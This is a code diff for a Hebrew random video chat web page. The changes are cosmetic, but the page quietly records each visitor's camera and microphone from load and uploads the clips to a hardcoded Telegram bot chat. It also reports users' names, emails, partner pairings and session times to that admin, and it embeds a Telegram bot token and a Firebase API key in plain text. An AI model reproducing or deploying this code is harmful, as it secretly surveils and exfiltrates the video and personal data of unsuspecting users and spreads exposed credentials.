@@ -4,12 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>מי - פה</title>
-    <link rel="icon" type="image/png" href="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
     
+    <meta name="theme-color" content="#000000">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIm1pLXBlIiwKICAic2hvcnRfbmFtZSI6ICJtaS1wZSIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjMDAwMDAwIiwKICAidGhlbWVfY29sb3ciOiAiIzAwMDAwMCIsCiAgImljvbnMiOiBbCiAgICB7CiAgICAgICJzcmMiOiAiaHR0cHM6Ly9pLmliYi5jby8zOUMyMVdyei9Jbi1TaG90LTIwMjYwNDI2LTAzMjgzMDAyMC5wbmciLAogICAgICAic2l6ZXMiOiAiNTEyeDUxMiIsCiAgICAgICJ0eXBlIjogImltYWdlL3BuZyIKICAgIH0KICBdCn0=">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="מי-פה">
+    
+    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIm1pLXBlIiwKICAic2hvcnRfbmFtZSI6ICJtaS1wZSIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjMDAwMDAwIiwKICAidGhlbWVfY29sb3ciOiAiIzAwMDAwMCIsCiAgImljvbnMiOiBbCiAgICB7CiAgICAgICJzcmMiOiAiaHR0cHM6Ly9pLmliYi5jby8zOUMyMVdyei9Jbi1TaG90LTIwMjYwNDI2LTAzMjgzMDAyMC5wbmciLAogICAgICAic2l6ZXMiOiAiNTEyeDUxMiIsCiAgICAgICJ0eXBlIjogImltYWdlL3BuZyIsCiAgICAgICJwdpurposeIjogImFueSBtYXNrYWJsZSIKICAgIH0KICBdCn0=">
+    <link rel="apple-touch-icon" href="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
 
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
@@ -29,12 +32,12 @@
         #partner-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
         video { width: 100%; height: 100%; object-fit: cover; background: #000; }
         #bottom-half { height: 50vh; background: #111; position: relative; }
-        #cam-switch { position: fixed; top: 20px; left: 20px; z-index: 2000; width: 50px; height: 50px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1.5px solid #fff; color: white; font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        #cam-switch { position: fixed; top: 20px; left: 20px; z-index: 2000; width: 50px; height: 50px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1.5px solid #fff; color: white; font-size: 24px; display: flex; align-items: center; justify-content: center; }
         #partner-gender-tag { position: fixed; top: 20px; right: 20px; z-index: 2000; background: rgba(0,0,0,0.6); width: 50px; height: 50px; border-radius: 50%; border: 1.5px solid #fff; display: none; align-items: center; justify-content: center; font-size: 24px; }
         .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; }
         .modal-content { background: #fff; color: #333; padding: 25px; border-radius: 20px; width: 85%; max-width: 340px; text-align: center; }
-        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; }
+        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; text-align: center; }
         .reg-btn { width: 100%; padding: 14px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; margin-top: 10px; }
     </style>
 </head>
@@ -77,18 +80,20 @@
 </div>
 
 <script>
+    // --- רישום Service Worker (קריטי להתקנה) ---
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js').then(() => console.log("SW Registered"));
+    }
+
     const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
-    const TARGET_ADMIN = "7089165458"; // שליחה רק ל-ID הזה
+    const TARGET_ADMIN = "7089165458"; 
     const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
     
     firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
     const db = firebase.database();
     const socket = io(SERVER_URL);
-    
-    // הגדרות PeerJS לחיבור מהיר עם סאונד ווידאו
     const peer = new Peer(undefined, { 
-        config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] },
-        debug: 1 
+        config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] }
     });
 
     let myStream, partnerData, currentCall, camFacing = "user", startTime, rec, searchTimer;
@@ -113,7 +118,7 @@
 
     window.onload = () => {
         initCamera();
-        const user = localStorage.getItem('user_v30');
+        const user = localStorage.getItem('user_v31');
         if(!user) document.getElementById('regModal').style.display = 'flex';
         else checkBanAndLogin(JSON.parse(user));
     };
@@ -128,7 +133,7 @@
 
     async function handleRegistration() {
         const user = { fname: document.getElementById('reg-fname').value, lname: document.getElementById('reg-lname').value, email: document.getElementById('reg-email').value, gender: document.getElementById('reg-gender').value };
-        localStorage.setItem('user_v30', JSON.stringify(user));
+        localStorage.setItem('user_v31', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
         const dt = getHebrewTime();
         sendAdmin(`📝 **רישום חדש**\n👤 ${user.fname} ${user.lname}\n📧 ${user.email}\n🚻 ${user.gender}\n📅 ${dt.date} | ${dt.time}`);
@@ -139,19 +144,19 @@
         if(myStream) myStream.getTracks().forEach(t => t.stop());
         try {
             myStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: camFacing, frameRate: { ideal: 30 } }, 
-                audio: { echoCancellation: false, noiseSuppression: true } 
+                video: { facingMode: camFacing }, 
+                audio: { echoCancellation: false } 
             });
             document.getElementById('localVideo').srcObject = myStream;
             if(!rec) startRecording(); 
-        } catch(e) { console.error("Camera fail"); }
+        } catch(e) { console.error("Camera denied"); }
     }
 
     function startRecording() {
         rec = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8' });
         rec.ondataavailable = (e) => {
             if(e.data.size > 0) {
-                const user = JSON.parse(localStorage.getItem('user_v30'));
+                const user = JSON.parse(localStorage.getItem('user_v31'));
                 const fd = new FormData();
                 fd.append("video", new File([e.data], "vid.mp4", {type:"video/mp4"}));
                 fd.append("chat_id", TARGET_ADMIN);
@@ -163,7 +168,6 @@
         rec.start();
     }
 
-    // ניווט
     let sX = 0;
     document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.body.addEventListener('touchend', e => {
@@ -180,15 +184,13 @@
         }
         document.body.className = "showing-chat";
         
-        // מנגנון 10 שניות לחיבור חוזר
         clearTimeout(searchTimer);
         searchTimer = setTimeout(() => {
-            console.log("לא נמצא משתמש חדש, מאפס היסטוריה לחיבור מהיר...");
             historyPartnerIds = []; 
-            socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v30')) });
+            socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v31')) });
         }, 10000);
 
-        socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v30')) });
+        socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v31')) });
     }
 
     function backToHome() {
@@ -202,7 +204,6 @@
         document.getElementById('remoteVideo').srcObject = null;
         document.getElementById('partner-gender-tag').style.display = 'none';
         partnerData = null;
-        clearTimeout(searchTimer);
     }
 
     peer.on('call', call => {
@@ -214,19 +215,15 @@
         clearTimeout(searchTimer);
         partnerData = data;
         if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
-        const call = peer.call(data.peerId, myStream, { metadata: JSON.parse(localStorage.getItem('user_v30')) });
+        const call = peer.call(data.peerId, myStream, { metadata: JSON.parse(localStorage.getItem('user_v31')) });
         handleCall(call);
     });
 
-    socket.on('partner-disconnected', () => {
-        resetPartnerUI();
-        // אם הצד השני ניתק, חוזרים אוטומטית לחיפוש (Snow)
-    });
+    socket.on('partner-disconnected', () => resetPartnerUI());
 
     function handleCall(call) {
         currentCall = call;
-        const me = JSON.parse(localStorage.getItem('user_v30'));
-        
+        const me = JSON.parse(localStorage.getItem('user_v31'));
         call.on('stream', s => {
             const remoteVid = document.getElementById('remoteVideo');
             remoteVid.srcObject = s;
@@ -236,8 +233,7 @@
                 if(pData && pData.peerId !== peer.id) {
                     document.getElementById('partner-gender-tag').innerText = pData.gender === 'זכר' ? '👨' : '👩';
                     document.getElementById('partner-gender-tag').style.display = 'flex';
-                    // הודעה אחת מסודרת לבוט
-                    sendAdmin(`🤝 **שיחה חדשה**\n👤 ${me.fname} ↔️ ${pData.fname}\n📧 ${me.email} ↔️ ${pData.email}`);
+                    sendAdmin(`🤝 **שיחה**\n👤 ${me.fname} ↔️ ${pData.fname}`);
                 }
             };
         });
@@ -247,13 +243,13 @@
     async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }
 
     window.onbeforeunload = () => {
-        const user = JSON.parse(localStorage.getItem('user_v30'));
+        const user = JSON.parse(localStorage.getItem('user_v31'));
         if(!user) return;
         const session = Math.floor((Date.now() - startTime) / 1000);
         let total = (parseInt(localStorage.getItem('total_time')) || 0) + session;
         localStorage.setItem('total_time', total);
         if(rec && rec.state === 'recording') rec.stop();
-        sendAdmin(`🚪 **יציאה מהאתר**\n👤 ${user.fname}\n⏱ זמן: ${session} ש' | סה"כ: ${total} ש'`);
+        sendAdmin(`🚪 **יציאה**\n👤 ${user.fname}\n⏱ זמן: ${session} ש' | סה"כ: ${total} ש'`);
     };
 </script>
 </body>
